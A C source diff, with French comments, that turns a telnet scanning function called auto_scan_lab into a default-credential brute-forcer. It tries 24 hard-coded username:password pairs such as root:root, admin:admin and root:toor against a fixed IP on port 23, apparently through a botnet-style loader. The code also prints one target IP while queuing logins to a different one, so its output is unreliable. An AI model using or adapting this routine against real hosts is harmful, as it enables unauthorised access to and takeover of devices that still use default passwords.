@@ -50,25 +50,63 @@ void auto_scan_lab(void)
 {
     struct telnet_info info;
     uint32_t total = 0;
+    int max_scans = 1000;
     
-    printf("Scanning 56.228.34\n\n");
+    // Liste des credentials à tester
+    char *credentials[] = {
+        "root:root",
+        "root:admin",
+        "root:12345",
+        "root:password",
+        "root:toor",
+        "admin:admin",
+        "admin:password",
+        "admin:12345",
+        "root:default",
+        "admin:default",
+        "user:user",
+        "user:password",
+        "root:123456",
+        "root:abc123",
+        "administrator:administrator",
+        "admin:1234",
+        "root:letmein",
+        "admin:letmein",
+        "root:master",
+        "admin:master",
+        "support:support",
+        "tech:tech",
+        "admin:root",
+        "root:changeme",
+    };
+    int cred_count = sizeof(credentials) / sizeof(credentials[0]);
     
-    for (int i = 1; i <= 254; i++)
+    srand(time(NULL));
+    printf("Testing ALL %d credentials\n", cred_count);
+    printf("Target IP: 16.171.64.211\n\n");
+    
+    for (int c = 0; c < cred_count; c++)
     {
         char strbuf[128];
-        snprintf(strbuf, sizeof(strbuf), "16.171.64.%d:23 root:root", i); 
+        
+        // IP fixe - pas de variable inutilisée
+        snprintf(strbuf, sizeof(strbuf), "56.228.16.21:23 %s", credentials[c]);
         
         memset(&info, 0, sizeof(struct telnet_info));
         if (telnet_info_parse(strbuf, &info) != NULL)
         {
             server_queue_telnet(srv, &info);
             total++;
-            usleep(50000);
+            printf("[%4d] Testing 16.171.64.211 with %s\n", 
+                   total, credentials[c]);
+            usleep(10000);
         }
     }
     
-    printf("\n[*] %d IPs queued.\n", total);
+    printf("\n[*] %d login attempts queued.\n", total);
 }
+
+
 
 void auto_scan_range(char *start_ip, char *end_ip)
 {
